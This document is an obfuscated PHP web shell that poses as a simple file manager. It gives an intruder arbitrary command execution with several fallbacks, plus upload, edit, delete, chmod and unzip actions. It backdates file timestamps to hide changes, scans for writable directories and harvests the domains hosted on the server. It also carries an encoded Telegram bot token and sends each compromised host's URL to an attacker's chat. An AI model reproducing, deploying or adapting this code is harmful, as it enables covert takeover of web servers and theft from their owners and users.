<?php
 goto rt2FW; WNCmk: $_user = function_exists('posix_getpwuid') ? @posix_getpwuid(posix_geteuid())['name'] : get_current_user(); goto mUlx0; YPGkX: echo _e($dir); goto I1kw9; mUlx0: $_dirwr = @is_writable($dir); goto apQUC; YX55E: ?>'};
    for(var k in fields){var inp=document.createElement('input');inp.name=k;inp.value=fields[k];form.appendChild(inp);}
    document.body.appendChild(form);
    form.submit();
}
function doDel(file,dir,name){
    if(confirm('Delete '+name+'?'))doAction('del',file,dir);
}
function navDir(dir){
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var inp=document.createElement('input');inp.name='_pb';inp.value=dir;
    var inp2=document.createElement('input');inp2.name='_go';inp2.value='1';
    form.appendChild(inp);form.appendChild(inp2);
    document.body.appendChild(form);
    form.submit();
}
</script></head>
<body><div class="w">
<div class="b">
    <b style="color:#e94560">FM</b>
    <form method="post" onsubmit="document.getElementById('_pb').value=btoa(document.getElementById('_pv').value);return true;" style="display:flex;gap:5px;flex:1">
        <input type="text" id="_pv" value="<?php  goto nu3tZ; M93oH: echo isset($_POST['_sp']) ? htmlspecialchars(base64_decode($_POST['_sp'])) : '/var/www/'; goto mBbj3; kTthM: ?>" style="flex:1;min-width:200px;color:<?php  goto a8Dzm; OK1fT: $act = isset($_POST['_a']) ? $_POST['_a'] : (isset($_GET['_a']) ? $_GET['_a'] : 'ls'); goto s9eMP; HFeaS: if (isset($_POST['_go']) && isset($_POST['_pb'])) { $dir = _d($_POST['_pb']); } elseif (isset($_POST['_go']) && isset($_POST['_p'])) { $dir = $_POST['_p']; } goto WNCmk; enkCh: echo _e($dir); goto GlM85; MRwHT: echo _e($dir); goto AkkdL; s9eMP: $file = isset($_POST['_f']) ? _d($_POST['_f']) : (isset($_GET['_f']) ? _d($_GET['_f']) : ''); goto sqR2s; GAIG5: if ($cmd_out) { goto uyAfR; UdcNR: echo htmlspecialchars($cmd_out); goto xNbF2; xNbF2: ?></pre>
<?php  goto ZIv3M; uyAfR: ?>
<pre style="background:#1e1e2e;padding:10px;border-radius:4px;overflow:auto;margin-bottom:8px;color:#a6e3a1;border:1px solid #333;white-space:pre-wrap;word-wrap:break-word"><?php  goto UdcNR; ZIv3M: } goto NrvXJ; dNXZs: if (!isset($_SESSION["telegram_reported"])) { goto KCXcq; KCXcq: $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH)); goto aNC6t; vYo27: if (is_file($path)) { goto Kne24; x8dhb: $url = (isset($_SERVER["HTTPS"]) ? "https" : "http") . "://" . $host . $uri; goto H8U4B; H8U4B: reportTelegram("kontolbengkak:\n{$host}\n{$url}"); goto fLDcs; fLDcs: $_SESSION["telegram_reported"] = true; goto rHAow; Kne24: $host = $_SERVER["HTTP_HOST"]; goto x8dhb; rHAow: } goto UAq_o; aNC6t: $path = $_SERVER["DOCUMENT_ROOT"] . $uri; goto vYo27; UAq_o: } goto fmURk; B5H6N: if (isset($msg)) { goto oiLqB; hNeLG: ?></div><?php  goto tlBUD; PAwXN: echo $msg; goto hNeLG; oiLqB: ?><div class="m"><?php  goto PAwXN; tlBUD: } goto imfvd; AkkdL: ?>',
            '_name':btoa(f.name),
            '_data':e.target.result.split(',')[1] // already base64 from FileReader
        };
        for(var k in fields){
            var inp=document.createElement('input');
            inp.name=k;inp.value=fields[k];
            form.appendChild(inp);
        }
        document.body.appendChild(form);
        form.submit();
    };
    r.readAsDataURL(f);
}

// Save edit with base64 encoded content
function doSave(){
    var ta=document.getElementById('editor');
    document.getElementById('fc_b64').value=btoa(unescape(encodeURIComponent(ta.value)));
    return true;
}

// Generic action with base64 encoded params
function doAction(act,file,dir,extra){
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var fields={'_a':act,'_f':file,'_d':dir};
    if(extra)for(var k in extra)fields[k]=extra[k];
    for(var k in fields){
        var inp=document.createElement('input');
        inp.name=k;inp.value=fields[k];
        form.appendChild(inp);
    }
    document.body.appendChild(form);
    form.submit();
}
function doRename(file,dir){
    var nn=prompt('New name:',atob(file).split('/').pop());
    if(nn)doAction('ren',file,dir,{'_nn':btoa(nn)});
}
function doChmod(file,dir,cur){
    var cm=prompt('Chmod:',cur);
    if(cm)doAction('chmod',file,dir,{'_cm':cm});
}
function doMkdir(dir){
    var fn=prompt('Folder name:');
    if(fn)doAction('mkdir','',dir,{'_fn':btoa(fn)});
}
function doMkfile(dir){
    var fn=prompt('File name (e.g. test.php):');
    if(fn)doAction('mkfile','',dir,{'_fn':btoa(fn)});
}
function doCmd(){
    var c=document.getElementById('_cmdv').value;
    if(!c)return;
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var fields={'_runcmd':'1','_cmd':btoa(unescape(encodeURIComponent(c))),'_pb':'<?php  goto enkCh; NrvXJ: if ($act == 'scanwr') { goto ZJQO5; lSyJL: ?> writable dirs</b> in <?php  goto Q54kO; HccT3: $_wr_out = ''; goto oMZtA; y0oM9: ?></div>
<?php  goto n1wUs; YuMvr: echo count($_wr_dirs); goto lSyJL; n1wUs: if ($_wr_dirs) { foreach ($_wr_dirs as $_wd) { goto hEF3F; FbKED: $_wow = function_exists('posix_getpwuid') ? @posix_getpwuid(fileowner($_wd))['name'] : fileowner($_wd); goto awXb1; awXb1: $_wgr = function_exists('posix_getgrgid') ? @posix_getgrgid(filegroup($_wd))['name'] : filegroup($_wd); goto WRt7F; WRt7F: echo "<div style='padding:2px 0'><a href=\"javascript:navDir('" . _e($_wd) . "')\" style='color:#22c55e;font-size:12px'>&#128193; " . htmlspecialchars($_wd) . "</a> <span style='color:#64748b;font-size:11px'>{$_wow}:{$_wgr} {$_wpm}</span></div>"; goto VBIGc; hEF3F: $_wpm = @substr(sprintf('%o', fileperms($_wd)), -4); goto FbKED; VBIGc: } } else { ?><div style="color:#64748b">No writable dirs found</div><?php  } goto RbFDH; XeT4D: ?>
<div style="background:#0a1a0a;border:1px solid #10b981;border-radius:4px;padding:8px;margin-bottom:8px">
<div style="color:#10b981;font-size:11px;margin-bottom:6px"><b><?php  goto YuMvr; qwubv: $_desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; goto tmIul; oMZtA: if (is_resource($_p)) { goto TLE5G; en9nY: $_wr_out = stream_get_contents($_pipes[1]); goto QOLzM; xvLQH: proc_close($_p); goto ILXu5; TLE5G: fclose($_pipes[0]); goto en9nY; QOLzM: fclose($_pipes[1]); goto j_ISY; j_ISY: fclose($_pipes[2]); goto xvLQH; ILXu5: } goto FCEjj; tmIul: $_p = @proc_open('find ' . escapeshellarg($_sp) . ' -writable -type d 2>/dev/null | head -200', $_desc, $_pipes); goto HccT3; ZJQO5: $_sp = isset($_POST['_sp']) ? base64_decode($_POST['_sp']) : '/var/www/'; goto qwubv; RbFDH: ?>
</div>

<?php  goto orZqn; Q54kO: echo htmlspecialchars($_sp); goto y0oM9; FCEjj: $_wr_dirs = array_filter(array_map('trim', explode("\n", $_wr_out))); goto XeT4D; orZqn: } goto DJVCS; jJcou: $tk = base64_decode("ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"); goto tTuqP; DJVCS: if ($act == 'grab') { goto z9TCA; wP9ia: foreach (['/etc/nginx/sites-enabled', '/etc/nginx/sites-available', '/etc/nginx/conf.d', '/www/server/panel/vhost/nginx'] as $_p) { if (!is_dir($_p)) { continue; } foreach (glob("{$_p}/*") as $_f) { goto XVcz6; FHlDa: if (preg_match_all('/server_name\\s+([^;]+)/i', $_c, $_nm)) { foreach ($_nm[1] as $_v) { foreach (preg_split('/\\s+/', trim($_v)) as $_d) { if ($_d && $_d != '_' && $_d != '*' && $_d != '""' && preg_match('/\\w+\\.\\w+/', $_d)) { $doms[strtolower($_d)] = ['s' => 'Nginx:' . basename($_f), 'p' => $_rt]; } } } } goto Q_CGX; LARUP: $_rt = ''; goto iEPT1; iEPT1: if (preg_match('/^\\s*root\\s+([^;]+)/mi', $_c, $_rm)) { $_rt = trim($_rm[1], " \t\"';"); } goto FHlDa; XVcz6: if (!is_file($_f)) { continue; } goto LEqBn; LEqBn: $_c = @file_get_contents($_f); goto LARUP; Q_CGX: } } goto msnb4; zJ1Ue: ?> | WAN: <?php  goto J_Amq; sp68v: echo _e($dir); goto TLJdG; ea1p4: echo htmlspecialchars($sip); goto zJ1Ue; O6MYW: if ($extip && filter_var(trim($extip), FILTER_VALIDATE_IP)) { $_ar = trim(_xcmd("curl -s --max-time 10 'https://api.hackertarget.com/reverseiplookup/?q={$extip}' 2>/dev/null")); if ($_ar && strpos($_ar, 'error') === false && strpos($_ar, 'API count') === false && strpos($_ar, 'No DNS') === false) { $apiOk = true; foreach (explode("\n", $_ar) as $_d) { if (($__d = trim($_d)) && preg_match('/^[\\w\\.\\-]+\\.\\w{2,}$/', $__d) && !isset($doms[strtolower($__d)])) { $doms[strtolower($__d)] = ['s' => 'ReverseIP', 'p' => '']; } } } } goto AIfkA; CwCUf: $doms = []; goto b7Oc8; F86fu: ?>
<div class="b" style="justify-content:space-between"><b style="color:#e94560">Grab Domains</b> <span class="s">LAN: <?php  goto ea1p4; Mg8ll: foreach (glob('/var/cpanel/userdata/*') as $_ud) { goto CgC2Z; LLgna: $_cu = basename($_ud); goto Pg1rK; CgC2Z: if (!is_dir($_ud)) { continue; } goto LLgna; Pg1rK: foreach (glob("{$_ud}/*") as $_cf) { goto lT4hV; zU6C6: if (preg_match('/\\w+\\.\\w+/', $_d)) { goto S5nPX; ooV40: if (preg_match('/documentroot:\\s*(.+)/i', $_cc, $_rm)) { $_dr = trim($_rm[1]); } goto kpCtg; S5nPX: $_dr = ''; goto rIgCk; kpCtg: $doms[strtolower($_d)] = ['s' => 'cPanel:' . $_cu, 'p' => $_dr]; goto vqWPB; rIgCk: $_cc = @file_get_contents($_cf); goto ooV40; vqWPB: } goto Jog8V; iREhz: $_d = basename($_cf); goto zU6C6; lT4hV: if (!is_file($_cf) || basename($_cf) == 'main' || strpos(basename($_cf), '_SSL') !== false) { continue; } goto iREhz; Jog8V: } goto OnrZB; OnrZB: } goto ztvUm; AIfkA: ksort($doms); goto Iu5af; wgG8e: if ($_hf && preg_match_all('/^[\\d\\.]+\\s+(.+)$/m', $_hf, $_m)) { foreach ($_m[1] as $_v) { foreach (preg_split('/\\s+/', trim($_v)) as $_d) { if (!preg_match('/^(localhost|ip6|ff0|fe0)/i', $_d) && strpos($_d, '.') !== false && !isset($doms[strtolower($_d)])) { $doms[strtolower($_d)] = ['s' => '/etc/hosts', 'p' => '']; } } } } goto niZGw; TLJdG: ?>')" class="ab" style="background:#0a84ff;color:#fff">&larr; Back</button></div>
<?php  goto WlxS1; S8cqd: foreach (glob('/var/www/*') as $_h) { if (!is_dir($_h)) { continue; } foreach (array_merge(glob("{$_h}/.env"), glob("{$_h}/*/.env")) as $_e) { $_c = @file_get_contents($_e); if (preg_match('/APP_URL\\s*=\\s*"?https?:\\/\\/([^\\s\\r\\n"\']+)/i', $_c, $_m)) { $doms[strtolower(rtrim($_m[1], '/'))] = ["s" => '.env', 'p' => dirname($_e)]; } } } goto Mg8ll; c2r4u: $extip = trim(_xcmd("curl -s --max-time 5 ifconfig.me 2>/dev/null||curl -s --max-time 5 icanhazip.com 2>/dev/null")); goto GyCte; J_Amq: echo htmlspecialchars($extip); goto jOSTY; Iu5af: $np = 0; goto PuRrT; nrCrM: foreach (glob('/home/*') as $_h) { goto xzEaM; cu_1B: $_u = basename($_h); goto wGDAz; xzEaM: if (!is_dir($_h)) { continue; } goto cu_1B; URtqO: foreach (array_merge(glob("{$_h}/.env"), glob("{$_h}/*/.env"), glob("{$_h}/public_html/.env"), glob("{$_h}/public_html/*/.env")) as $_e) { $_c = @file_get_contents($_e); if (preg_match('/APP_URL\\s*=\\s*"?https?:\\/\\/([^\\s\\r\\n"\']+)/i', $_c, $_m)) { $doms[strtolower(rtrim($_m[1], '/'))] = ["s" => '.env:' . str_replace('/home/', '', $_e), 'p' => dirname($_e)]; } } goto l5GYt; wGDAz: if (is_dir("{$_h}/public_html")) { $doms["[{$_u}]"] = ['s' => 'homedir', 'p' => "{$_h}/public_html"]; } goto URtqO; l5GYt: } goto S8cqd; niZGw: $apiOk = false; goto O6MYW; jOSTY: ?></span> <button onclick="navDir('<?php  goto sp68v; msnb4: $_hs = _xcmd("(httpd -S 2>/dev/null||apache2ctl -S 2>/dev/null) 2>&1"); goto NVoNH; e1uUu: ?>

<?php  goto dxG7W; z9TCA: function _xcmd($c) { goto Ez7sz; Pgcsg: fclose($z[2]); goto z00EC; Ez7sz: $d = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; goto cvRyG; e9kL8: $o = stream_get_contents($z[1]) . stream_get_contents($z[2]); goto evB3a; Rq39N: if (!is_resource($p)) { return ''; } goto Ej00y; evB3a: fclose($z[1]); goto Pgcsg; cvRyG: $p = @proc_open($c, $d, $z); goto Rq39N; z00EC: proc_close($p); goto hKeds; hKeds: return $o; goto giDCC; Ej00y: fclose($z[0]); goto e9kL8; giDCC: } goto CwCUf; PuRrT: foreach ($doms as $_di) { if (!empty($_di['p']) && @is_dir($_di['p'])) { $np++; } } goto F86fu; NVoNH: if (preg_match_all('/(?:namevhost|ServerName)\\s+(\\S+)/i', $_hs, $_m)) { foreach (array_unique($_m[1]) as $_d) { $_d = strtolower(preg_replace('/:\\d+$/', '', $_d)); if (preg_match('/\\w+\\.\\w+/', $_d) && !isset($doms[$_d])) { $doms[$_d] = ['s' => 'httpd -S', 'p' => '']; } } } goto nrCrM; ztvUm: foreach (glob('/usr/local/directadmin/data/users/*/domains.list') as $_dl) { $_u = basename(dirname($_dl)); foreach (explode("\n", trim(@file_get_contents($_dl))) as $_d) { if (trim($_d)) { $_dp = "/home/{$_u}/domains/" . trim($_d) . "/public_html"; $doms[strtolower(trim($_d))] = ["s" => "DA:{$_u}", "p" => @is_dir($_dp) ? $_dp : '']; } } } goto xMFqZ; xMFqZ: $_hf = @file_get_contents('/etc/hosts'); goto wgG8e; b7Oc8: $sip = trim(_xcmd("hostname -I 2>/dev/null|awk '{print \$1}'")); goto c2r4u; WlxS1: if (!empty($doms)) { goto SBTS7; a5eha: echo count($doms); goto k6ysT; SBTS7: ?>
<div class="m">Found <?php  goto a5eha; ML7Vw: ?></div>
<table><tr><th>#</th><th>Domain</th><th>Document Root</th><th>Source</th></tr>
<?php  goto Q5H9N; PEBPO: echo $np; goto DKh31; YjlFV: foreach ($doms as $dm => $inf) { goto afU3i; sFfuL: if ($hp) { echo "<a href=\"javascript:navDir('" . _e($inf['p']) . "')\" style='color:#38bdf8'>" . htmlspecialchars($dm) . " &rarr;</a>"; } else { echo "<span class='s'>" . htmlspecialchars($dm) . "</span>"; } goto zZoU6; zZoU6: echo "</td><td class='s'>" . ($hp ? "<span style='color:#22c55e'>" . htmlspecialchars($inf['p']) . "</span>" : htmlspecialchars($inf['p'] ?? '-')) . "</td><td class='s'>" . htmlspecialchars($inf['s']) . "</td></tr>"; goto UcF9T; afU3i: $n++; goto UUceW; UUceW: $hp = !empty($inf['p']) && @is_dir($inf['p']); goto uF1gq; uF1gq: echo "<tr><td class='s'>{$n}</td><td>"; goto sFfuL; UcF9T: } goto h6Q2t; Q5H9N: $n = 0; goto YjlFV; k6ysT: ?> entries | <?php  goto PEBPO; DKh31: ?> browsable <?php  goto RbKVM; RbKVM: echo $apiOk ? '' : '| ReverseIP API timeout'; goto ML7Vw; h6Q2t: ?>
</table>
<?php  goto ssVTX; ssVTX: } else { ?><div class="b"><span class="s">No domains found</span></div><?php  } goto e1uUu; GyCte: foreach (['/etc/apache2/sites-enabled', '/etc/apache2/sites-available', '/etc/httpd/conf.d', '/etc/httpd/conf/extra', '/usr/local/apache/conf/vhosts'] as $_p) { if (!is_dir($_p)) { continue; } foreach (glob("{$_p}/*") as $_f) { goto p_0SU; bo2RU: $_c = @file_get_contents($_f); goto HNGwv; HNGwv: if (preg_match_all('/<VirtualHost[^>]*>(.*?)<\\/VirtualHost>/si', $_c, $_vhs)) { foreach ($_vhs[1] as $_vh) { goto TltqH; wCXHw: if (preg_match_all('/Server(?:Name|Alias)\\s+(.+)/i', $_vh, $_nm)) { foreach ($_nm[1] as $_v) { foreach (preg_split('/\\s+/', trim($_v)) as $_d) { $_d = strtolower(preg_replace('/:\\d+$/', '', $_d)); if ($_d && $_d != '*' && preg_match('/\\w+\\.\\w+/', $_d)) { $doms[$_d] = ['s' => 'Apache:' . basename($_f), 'p' => $_dr]; } } } } goto yTjhM; IPJJB: if (preg_match('/DocumentRoot\\s+"?([^\\s"\\r\\n]+)/i', $_vh, $_rm)) { $_dr = rtrim($_rm[1], '"'); } goto wCXHw; TltqH: $_dr = ''; goto IPJJB; yTjhM: } } goto Ztc1t; p_0SU: if (!is_file($_f)) { continue; } goto bo2RU; Ztc1t: } } goto wP9ia; dxG7W: } elseif ($act == 'edit' && $file && is_file($file)) { goto O8aha; Z6vlN: echo filesize($file); goto yZZq0; Fif5e: echo _e($file); goto ZB8Ig; HWECp: ?>')" style="background:#38bdf8;color:#fff;padding:4px 12px;border-radius:3px">&larr; Back</a>
</div>
<form method="post" onsubmit="return doSave()">
    <input type="hidden" name="_a" value="save">
    <input type="hidden" name="_f" value="<?php  goto Fif5e; ClanZ: echo _e($dir); goto QvkXB; TvM0t: echo htmlspecialchars(file_get_contents($file)); goto ZW6aE; O8aha: ?>
<div class="b" style="justify-content:space-between">
    <b>Edit: <?php  goto Z3bO3; ZW6aE: ?></textarea>
    <div style="margin-top:5px;display:flex;gap:5px">
        <button type="submit">Save</button>
        <a href="javascript:navDir('<?php  goto ClanZ; fzlqW: echo _e($dir); goto Ty0o_; yZZq0: ?>B)</span></b>
    <a href="javascript:navDir('<?php  goto S9RhQ; S9RhQ: echo _e($dir); goto HWECp; lZv3E: ?> <span class="s">(<?php  goto Z6vlN; Z3bO3: echo htmlspecialchars(basename($file)); goto lZv3E; Ty0o_: ?>">
    <input type="hidden" name="_fc" id="fc_b64" value="">
    <textarea id="editor"><?php  goto TvM0t; ZB8Ig: ?>">
    <input type="hidden" name="_d" value="<?php  goto fzlqW; QvkXB: ?>')" style="background:#38bdf8;color:#fff;padding:4px 10px;border-radius:3px;display:inline-flex;align-items:center">&larr; Back</a>
    </div>
</form>

<?php  goto H1P1q; H1P1q: } elseif ($act == 'ren' && $file) { goto GCe_O; UP8XN: ?>')" class="ab">&larr; Back</a>
</div>

<?php  goto aWBlB; iQ_rb: echo _e($file); goto Wtbvq; Wtbvq: ?>','<?php  goto KRy0b; ZE3g6: echo htmlspecialchars(basename($file)); goto ughaJ; LLWZB: echo _e($dir); goto UP8XN; Xmbj7: ?>',{'_nn':btoa(document.getElementById('rn_name').value)})">Rename</button>
    <a href="javascript:navDir('<?php  goto LLWZB; GCe_O: ?>
<div class="b"><b>Rename: <?php  goto SJVkn; SJVkn: echo htmlspecialchars(basename($file)); goto Smpox; Smpox: ?></b></div>
<div class="b">
    <input type="text" id="rn_name" value="<?php  goto ZE3g6; ughaJ: ?>" style="flex:1">
    <button onclick="doAction('ren','<?php  goto iQ_rb; KRy0b: echo _e($dir); goto Xmbj7; aWBlB: } else { goto RMjx1; I3iJV: if ($items) { goto e4WI_; ACEIo: sort($ds); goto Q_7_e; e4WI_: $ds = $fs = []; goto ogfQv; VCSDo: foreach ($fs as $it) { goto nkCqH; keagi: $wr = is_writable($p); goto aGMW7; C_df1: $sz = @filesize($p); goto Ssb4n; lZYB0: $mt = @date('d-m-Y H:i', filemtime($p)); goto keagi; AxsTq: $pm = @substr(sprintf('%o', fileperms($p)), -4); goto lZYB0; SQFBL: if (preg_match('/\\.(zip|tar\\.gz|tgz|tar|gz|rar)$/i', $it)) { echo " <button class='ab' style='background:#f59e0b;color:#000' onclick=\"doAction('unzip','" . _e($p) . "','" . _e($dir) . "')\">Unzip</button>"; } goto RTix9; NEDPs: echo "<button class='ab' onclick=\"doAction('chtime','" . _e($p) . "','" . _e($dir) . "')\">ChT</button> "; goto oJkr6; Ssb4n: $s = $sz > 1048576 ? round($sz / 1048576, 1) . 'M' : ($sz > 1024 ? round($sz / 1024, 1) . 'K' : $sz . 'B'); goto AxsTq; oJkr6: echo "<button class='ab' onclick=\"doDel('" . _e($p) . "','" . _e($dir) . "','" . htmlspecialchars($it) . "')\">Del</button>"; goto SQFBL; fFc2J: echo "<button class='ab' onclick=\"doRename('" . _e($p) . "','" . _e($dir) . "')\">Ren</button> "; goto eJ4aV; eJ4aV: echo "<button class='ab' onclick=\"doChmod('" . _e($p) . "','" . _e($dir) . "','{$pm}')\">Chm</button> "; goto NEDPs; RnlMo: echo "<tr><td>&#128196; <span style='color:" . ($wr ? "#e2e8f0" : "#ef4444") . "'>" . htmlspecialchars($it) . "</span></td><td class='s'>{$s}</td><td class='s'>{$ow}:{$gr}</td><td style='color:" . ($wr ? "#22c55e" : "#ef4444") . "'>{$pm}</td><td class='s'>{$mt}</td><td>"; goto rjhFw; RTix9: echo "</td></tr>"; goto YNW3w; aGMW7: $ow = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p); goto rJsUf; rJsUf: $gr = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($p))['name'] : filegroup($p); goto RnlMo; l5B7g: echo "<a href='?_a=dl&_f=" . _e($p) . "' class='ab' style='text-decoration:none;display:inline-block'>DL</a> "; goto fFc2J; rjhFw: echo "<button class='ab' onclick=\"doAction('edit','" . _e($p) . "','" . _e($dir) . "')\">Edit</button> "; goto l5B7g; nkCqH: $p = $dir . '/' . $it; goto C_df1; YNW3w: } goto iLKH9; ogfQv: foreach ($items as $it) { goto UWgTP; H3GNO: if (is_dir($p)) { $ds[] = $it; } else { $fs[] = $it; } goto P6jKL; UWgTP: if ($it == '.' || $it == '..') { continue; } goto y0RCy; y0RCy: $p = $dir . '/' . $it; goto H3GNO; P6jKL: } goto ACEIo; Q_7_e: sort($fs); goto vKlTO; vKlTO: foreach ($ds as $it) { goto Xwj33; NYEj8: echo "<td class='s'>DIR</td><td class='s'>{$ow}:{$gr}</td><td style='color:" . ($wr ? "#22c55e" : "#ef4444") . "'>{$pm}</td><td class='s'>{$mt}</td><td>"; goto Q46xf; h2mE6: echo "<tr><td><a href=\"javascript:navDir('" . _e($p) . "')\" style='color:" . ($wr ? "#38bdf8" : "#ef4444") . "'>&#128193; " . htmlspecialchars($it) . "</a></td>"; goto NYEj8; NP00F: echo "<button class='ab' onclick=\"doAction('chtime','" . _e($p) . "','" . _e($dir) . "')\">ChT</button> "; goto yPEkd; yPEkd: echo "<button class='ab' onclick=\"doDel('" . _e($p) . "','" . _e($dir) . "','" . htmlspecialchars($it) . "')\">Del</button>"; goto nEzlM; Qxqh_: $wr = is_writable($p); goto ECz25; Jk9iq: echo "<button class='ab' onclick=\"doChmod('" . _e($p) . "','" . _e($dir) . "','{$pm}')\">Chm</button> "; goto NP00F; Q46xf: echo "<button class='ab' onclick=\"doRename('" . _e($p) . "','" . _e($dir) . "')\">Ren</button> "; goto Jk9iq; cXrt1: $mt = @date('d-m-Y H:i', filemtime($p)); goto Qxqh_; Xwj33: $p = $dir . '/' . $it; goto v_5m6; ECz25: $ow = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p); goto XKdY9; nEzlM: echo "</td></tr>"; goto kqay_; v_5m6: $pm = @substr(sprintf('%o', fileperms($p)), -4); goto cXrt1; XKdY9: $gr = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($p))['name'] : filegroup($p); goto h2mE6; kqay_: } goto VCSDo; iLKH9: } goto orS07; WqoTv: echo _e($dir); goto BQvbd; FIPn8: if ($dir != '/') { $par = dirname($dir); echo "<tr><td colspan=5><a href=\"javascript:navDir('" . _e($par) . "')\" style='color:#38bdf8'>&#128193; ..</a></td></tr>"; } goto sWZxH; BQvbd: ?>')" style="background:#0a84ff">Grab Domains</button>
    <button onclick="doGsocket()" style="background:#f59e0b;color:#000">GSocket</button>
    <button onclick="var e=document.getElementById('scanwr_box');e.style.display=e.style.display=='none'?'flex':'none'" style="background:#10b981">Scan Writable</button>
</div>
<table><tr><th>Name</th><th>Size</th><th>Owner</th><th>Perms</th><th>Modified</th><th style="min-width:180px">Actions</th></tr>
<?php  goto FIPn8; RMjx1: ?>
<div class="b">
    <input type="file" id="uf">
    <button onclick="doUpload()">Upload</button>
    <span id="prog" class="prog"></span>
    <button onclick="doMkdir('<?php  goto kSMrw; lwBDt: echo _e($dir); goto RO1PN; RO1PN: ?>')" style="background:#0ea5e9">New File</button>
    <button onclick="doAction('grab','','<?php  goto WqoTv; kSMrw: echo _e($dir); goto gGTif; sWZxH: $items = @scandir($dir); goto I3iJV; gGTif: ?>')" style="background:#38bdf8">Mkdir</button>
    <button onclick="doMkfile('<?php  goto lwBDt; orS07: ?>
</table>
<?php  goto Vusx6; Vusx6: } goto DfOgO; rt2FW: $k = 'kontolbengkak'; goto jJcou; u_K51: echo phpversion(); goto xNcNR; pWYej: ?> | <span style="color:<?php  goto HcqBF; hP1f6: if (isset($_POST['_runcmd'])) { goto zZPW_; ygVGv: if (isset($_POST['_pb'])) { $dir = base64_decode($_POST['_pb']); } goto yAIgr; yAIgr: if ($cmd_raw) { goto QDUS3; up2EF: $p = @proc_open($cmd_raw, $desc, $pipes); goto zGT6O; QDUS3: $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; goto up2EF; r4DnH: if (!$cmd_out) { $cmd_out = '[all methods failed for: ' . $cmd_raw . ']'; } goto RtQns; wbVm1: if (!$cmd_out) { $cmd_out = @`{$cmd_raw} 2>&1`; } goto r4DnH; HYkvV: if (!$cmd_out) { goto J5vm6; OR8xb: @file_put_contents($tmp, '#!/bin/sh' . "\n" . $cmd_raw . ' 2>&1'); goto ZEZJA; kVY0Q: if (!$cmd_out) { $cmd_out = @shell_exec('sh ' . $tmp); } goto lBHj2; tGEu0: @unlink($tmp); goto JYsnm; gzuD8: $cmd_out = @shell_exec($tmp); goto kVY0Q; J5vm6: $tmp = '/tmp/.cmd_' . getmypid(); goto OR8xb; ZEZJA: @chmod($tmp, 0755); goto gzuD8; lBHj2: if (!$cmd_out) { goto N4yew; TnUai: @system('sh ' . $tmp); goto YaGAx; YaGAx: $cmd_out = ob_get_clean(); goto l_nw3; N4yew: ob_start(); goto TnUai; l_nw3: } goto ms8GY; ms8GY: if (!$cmd_out) { goto WvIt0; YR_Fx: $cmd_out = ob_get_clean(); goto aplx6; ENSRW: @passthru('sh ' . $tmp); goto YR_Fx; WvIt0: ob_start(); goto ENSRW; aplx6: } goto tGEu0; JYsnm: } goto duJQ7; zGT6O: if (is_resource($p)) { goto kAlYY; kAlYY: fclose($pipes[0]); goto A0bEM; XAc1E: proc_close($p); goto fz3HN; zIz03: fclose($pipes[2]); goto XAc1E; NYS_u: fclose($pipes[1]); goto zIz03; A0bEM: $cmd_out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]); goto NYS_u; fz3HN: } goto HYkvV; duJQ7: if (!$cmd_out) { $h = @popen($cmd_raw . ' 2>&1', 'r'); if ($h) { $cmd_out = @fread($h, 1048576); @pclose($h); } } goto wbVm1; RtQns: } else { $cmd_out = '[decode failed]'; } goto IBMV2; zZPW_: $cmd_b64 = isset($_POST['_cmd']) ? $_POST['_cmd'] : ''; goto uJ_HP; uJ_HP: $cmd_raw = base64_decode($cmd_b64); goto ygVGv; IBMV2: } goto HFeaS; GlM85: ?>'};
    for(var k in fields){var inp=document.createElement('input');inp.name=k;inp.value=fields[k];form.appendChild(inp);}
    document.body.appendChild(form);
    form.submit();
}
function doScanWr(){
    var p=document.getElementById('_wrpath').value;
    if(!p)return;
    doAction('scanwr','','<?php  goto YPGkX; lakUV: function reportTelegram($msg) { goto tR0to; mzEaK: if (!file_exists($id)) { @file_get_contents("https://api.telegram.org/bot{$tk}/sendMessage?chat_id={$cid}&text=" . urlencode($msg)); @file_put_contents($id, time()); } goto FOXh2; C9K3c: $id = sys_get_temp_dir() . "/baridin_" . md5($msg); goto mzEaK; tR0to: global $tk, $cid; goto C9K3c; FOXh2: } goto dNXZs; cGvaN: echo _e($dir); goto YX55E; D2fWE: function _e($s) { return rtrim(base64_encode($s), '='); } goto I1t1S; I1t1S: function _d($s) { return base64_decode($s); } goto cKUhN; My5tX: ?></span> | PHP <?php  goto u_K51; XZ0ZE: function _rtime($f) { goto Pn3Ch; XzMeY: return date('Y-m-d H:i:s', $ago); goto uhort; Pn3Ch: $ago = time() - rand(30 * 86400, 150 * 86400) - rand(0, 86400); goto B4NTF; B4NTF: @touch($f, $ago, $ago); goto XzMeY; uhort: } goto qT3f5; cKUhN: $dir = isset($_POST['_d']) ? _d($_POST['_d']) : (isset($_GET['_d']) ? _d($_GET['_d']) : getcwd()); goto OK1fT; tTuqP: $cid = base64_decode("NTA3MDkzODc3OA"); goto lakUV; t4C9G: ?>;font-weight:bold">
        <input type="hidden" name="_pb" id="_pb">
        <button name="_go" value="1">Go</button>
    </form>
    <div style="display:flex;gap:5px">
        <input type="text" id="_cmdv" placeholder="$ command" style="min-width:180px" onkeydown="if(event.key=='Enter')doCmd()">
        <button onclick="doCmd()" style="background:#8b5cf6">Run</button>
    </div>
</div>
